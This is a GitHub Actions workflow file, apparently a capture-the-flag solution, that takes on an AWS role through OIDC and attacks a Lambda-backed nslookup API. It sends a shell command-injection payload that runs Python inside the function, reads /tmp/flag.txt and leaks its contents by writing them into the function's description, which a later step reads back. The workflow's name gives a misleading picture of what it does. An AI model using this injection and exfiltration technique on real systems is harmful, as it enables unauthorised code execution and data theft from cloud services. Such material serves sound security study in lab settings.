name: AWS OIDC test for school standart old code procedure

on:
  push:
    branches:
      - corgi

permissions:
  id-token: write
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Direct URL-Decoded Exfiltration via Lambda Metadata
        run: |
          API_ID="3q931syi7b"
          REGION="us-east-1"
          URL="https://${API_ID}.execute-api.${REGION}.amazonaws.com/dev/nslookup"
          
          echo "=== 1. INJECTING SCRIPT TO READ, DECODE, AND UPDATE LAMBDA DESCRIPTION ==="
          # Read /tmp/flag.txt, URL-decode it using python's urllib.parse, and update function description
          PAYLOAD='{"domain": "127.0.0.1; python3 -c \"import boto3, urllib.parse; f=open(\\\"/tmp/flag.txt\\\").read().strip(); decoded=urllib.parse.unquote(f); boto3.client(\\\'lambda\\\').update_function_configuration(FunctionName=\\\'nslookupv2\\\', Description=decoded)\""}'
          
          curl -s -X POST "$URL" \
            -H "Content-Type: application/json" \
            -d "$PAYLOAD"
          
          echo ""
          echo "=== 2. WAITING 3 SECONDS FOR PROPAGATION ==="
          sleep 3
          
          echo "=== 3. FETCHING DECODED FLAG VIA CICDROLE ==="
          aws lambda get-function --function-name nslookupv2 --region ${REGION} --query 'Configuration.Description' --output text > ./the_flag.txt
          
          echo ""
          echo "=== 4. BEHOLD YOUR HARD-EARNED VICTORY ==="
          cat ./the_flag.txt
